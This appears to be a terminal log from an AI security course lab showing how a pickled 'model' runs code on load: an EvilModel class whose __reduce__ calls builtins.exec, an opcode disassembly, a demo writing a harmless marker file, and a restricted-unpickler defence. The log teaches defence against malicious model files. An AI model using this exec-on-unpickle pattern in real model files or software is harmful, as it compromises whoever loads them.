@@ -1,0 +1,65 @@
+thesecguy@lab:~$ thesecguy@lab:~$ cd ai-security-course-labs/labs/m09 && sed -n '/^_PAYLOAD/,/return (builtins/p' make_models.py
+
+_PAYLOAD = (
+    "import os;"
+    f"os.makedirs(r'{STATE}', exist_ok=True);"
+    f"open(r'{MARKER}', 'w').write("
+    "'LAB MARKER: loading this pickle executed code. This is a harmless lab placeholder, "
+    "not real malware. Delete me with: make clean')"
+)
+
+
+class EvilModel:
+    """Looks like a model object. The danger is in __reduce__, which pickle calls on load."""
+
+    def __reduce__(self):
+        # pickle will call builtins.exec(_PAYLOAD) while unpickling. That is the whole trick:
+        # the pickle format is allowed to say "call this function with these arguments".
+        return (builtins.exec, (_PAYLOAD,))
+thesecguy@lab:~/ai-security-course-labs/labs/m09$ .venv/bin/python explore.py pickle models/evil_model.pkl
+
+evil_model.pkl: 366 bytes, read as pickle instructions (nothing is run)
+
+    at  instruction       argument                                 meaning
+     0  PROTO             4                                        pickle format version
+     2  FRAME             355                                      size of the next chunk
+    11  SHORT_BINUNICODE  'builtins'                               push a piece of text
+    21  MEMOIZE                                                    keep a copy for later
+    22  SHORT_BINUNICODE  'exec'                                   push a piece of text
+    28  MEMOIZE                                                    keep a copy for later
+    29  STACK_GLOBAL                                               IMPORT the named function or class
+    30  MEMOIZE                                                    keep a copy for later
+    31  BINUNICODE        "import os;os.makedirs(r'/home/these...' push a piece of text
+   360  MEMOIZE                                                    keep a copy for later
+   361  TUPLE1                                                     pack 1 item as arguments
+   362  MEMOIZE                                                    keep a copy for later
+   363  REDUCE                                                     CALL it with those arguments
+   364  MEMOIZE                                                    keep a copy for later
+   365  STOP                                                       done: hand back the result
+
+imports (functions or classes it names): builtins.exec
+calls (REDUCE and friends):              1
+-> loading this file would CALL builtins.exec. Don't load it; part 2 is about this.
+thesecguy@lab:~/ai-security-course-labs/labs/m09$ make attack
+
+.venv/bin/python loader.py naive models/evil_model.pkl
+pickle.load(evil_model.pkl) ...
+returned: NoneType
+
+!! A marker file was written while 'just loading' the model:
+   /home/thesecguy/ai-security-course-labs/labs/m09/state/PWNED_BY_LAB_MODEL.txt
+   -> loading the pickle executed code. On a real model this would be malware.
+thesecguy@lab:~/ai-security-course-labs/labs/m09$ ls state && cat state/PWNED_BY_LAB_MODEL.txt; echo
+
+PWNED_BY_LAB_MODEL.txt
+LAB MARKER: loading this pickle executed code. This is a harmless lab placeholder, not real malware. Delete me with: make clean
+thesecguy@lab:~/ai-security-course-labs/labs/m09$ sed -n '/class Restricted/,/raise pickle/p' test_lab.py
+
+        class Restricted(pickle.Unpickler):
+            # The allow-list here is empty: this toy model is plain lists and needs no globals.
+            # A real loader would allow only the few weight classes it expects.
+            def find_class(self, module, name):
+                raise pickle.UnpicklingError(f"global '{module}.{name}' is forbidden")
+thesecguy@lab:~/ai-security-course-labs/labs/m09$ exit
+
+exit
